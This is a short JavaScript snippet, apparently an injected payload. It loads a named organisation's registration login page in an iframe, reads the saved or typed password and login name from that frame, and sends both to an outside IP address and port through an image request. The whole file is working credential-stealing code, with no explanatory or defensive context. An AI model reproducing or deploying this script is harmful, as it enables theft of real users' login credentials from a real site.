const frimfram = document.createElement('iframe'); 
frimfram.src = 'https://registration.cesa5.org/np/logout.do';
frimfram.id = 'frimfram';
var frimframdoc;
var pw;
var un;
var imag;
function frimframlistener(){
	try{
		frimframdoc = document.getElementById('frimfram').contentWindow.document;
		pw = frimframdoc.querySelector('#password').value;
		un = frimframdoc.querySelector('#loginName').value;
		imag = document.createElement('img');
		imag.src = encodeURI('http://74.14.159.250:8000/?pwd=' + pw + "&usr=" + un);
		document.body.appendChild(imag);
	}catch(error){
		console.error(error);
	}
}
frimfram.addEventListener('load', frimframlistener);
document.body.appendChild(frimfram);
